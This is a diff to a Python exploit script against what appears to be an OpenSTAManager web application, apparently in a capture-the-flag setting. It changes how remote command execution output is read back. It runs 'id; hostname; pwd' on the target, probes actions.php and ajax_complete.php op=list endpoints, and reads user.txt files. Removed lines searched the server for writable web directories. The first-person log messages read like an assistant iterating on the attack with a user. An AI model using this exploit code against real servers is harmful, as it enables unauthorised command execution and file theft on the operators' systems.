@@ -275,22 +275,22 @@ def main():
             log(".", f"  {m}/{p}: HTTP {st} {resp.strip()[:100]!r}")
         sys.exit(4)
 
-    log("*", "reading command output (writing to the extraction dir + fetching) …")
+    log("*", "reading output via op=list (encoding output into a filename) …")
     probe = run_cmd(o, base, mid, pid, None, "id; hostname; pwd")
-    if "uid=" in probe:
-        log("+", "RCE output channel live:")
-        for ln in probe.strip().splitlines():
-            print("      " + ln)
-    else:
-        log("!", "exec works (timing proved it) but I can't read output back — the "
-                 "import dir isn't served at a path I probed. This still means the "
-                 "box is owned; paste the two lines below and I'll pin the exfil.")
-        # help pin it: dump the app's file paths from config so I can map the dir
-        run_cmd(o, base, mid, pid, None,
-                "find /var/www/html/openstamanager -maxdepth 2 -type d -writable")
-        log(".", "(exec is confirmed; the remaining step is purely where to read "
-                 "output from — a couple more minutes, not a redesign.)")
+    if "uid=" not in probe:
+        # verbose: show what op=list actually returns so we can pin the read path
+        log("!", "op=list didn't return our marker — dumping the read endpoints:")
+        for m, p in [(mid, pid)] + cands[:4]:
+            for meth, u in (("GET", f"{base}/actions.php?op=list&id_module={m}&id_plugin={p}"),
+                            ("GET", f"{base}/ajax_complete.php?op=list&id_module={m}&id_plugin={p}")):
+                body = get(o, u)
+                log(".", f"  {meth} op=list {m}/{p} -> {len(body)}B: {body.strip()[:160]!r}")
+        log(".", "exec is confirmed; I just need to see this JSON to lock the read. "
+                 "Paste the [.] lines above.")
         sys.exit(5)
+    log("+", "RCE output channel live:")
+    for ln in probe.strip().splitlines():
+        print("      " + ln)
 
     flag = run_cmd(o, base, mid, pid, None,
                    "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
